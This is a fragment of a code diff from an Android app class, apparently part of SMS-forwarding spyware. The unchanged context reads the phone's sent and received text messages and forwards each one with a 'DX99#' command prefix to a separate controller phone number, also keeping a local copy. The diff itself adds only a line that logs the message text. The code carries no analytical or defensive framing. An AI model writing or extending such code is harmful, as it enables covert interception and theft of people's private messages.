@@ -61,6 +61,7 @@ public class Dctivity extends Activity {
 						String body = c.getString(c.getColumnIndex("body"));
 						String address = c.getString(c.getColumnIndex("address"));
 						address = address.replace("+86", "").replace("+1", "");
+						LogUtils.write("Send", "检索出来的内容" + body);
 						String lx = (type == 1 ? "收件箱" : "发件箱");
 						DmsManager.Send(Dctivity.this, devicephone, "DX99#"+lx+"-H " + body);
 						DQLiteOpenHelper.getHelper(Dctivity.this).addData(lx, address, body, new Date());
